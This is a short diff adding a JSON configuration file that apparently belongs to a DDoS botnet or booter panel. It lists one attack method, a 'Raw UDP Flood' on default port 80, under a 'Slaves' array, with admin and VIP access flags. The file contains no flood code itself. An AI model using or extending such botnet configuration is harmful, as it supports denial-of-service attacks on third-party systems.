@@ -1,0 +1,14 @@
+{
+    "AttackPrefix" : ".",
+    "Slaves" : [
+        
+        {
+            "ID" : 1,
+            "Name" : "udpraw",
+            "Description" : "Raw UDP Flood",
+            "DefaultPort" : "80",
+            "Admin" : true,
+            "Vip" : false
+        }
+    ]
+}
